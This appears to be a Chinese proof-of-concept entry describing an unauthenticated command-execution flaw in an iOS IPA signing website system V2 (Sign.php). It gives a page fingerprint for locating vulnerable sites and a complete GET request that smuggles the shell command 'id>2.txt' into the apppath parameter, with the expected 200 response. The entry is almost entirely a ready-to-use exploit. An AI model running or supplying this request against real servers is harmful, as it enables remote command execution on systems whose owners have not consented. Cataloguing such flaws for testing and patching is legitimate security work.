# iOS签名IPA网站系统V2存在前台Sign.php任意命令执行漏洞

- **系统**：iOS　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/assets/index/css/mobileSelect.css"`
- **请求**：`GET /api/sign/sign?udidres[0][sjskg]=1&noinject[name]=a&ttname=1&udid=1&appname=1&appid=a&appicon=1&apppath=id>2.txt&p12path=1&mppath=1&appbid=1&ipaPath=1&gm=0&filesPath=1&rm=1&app_name=1 HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`PS: 该Payload仅在Linux系统下可用，因为这个签名系统本身就需要Linux系统才能运行.`
- **预期**：200　|　—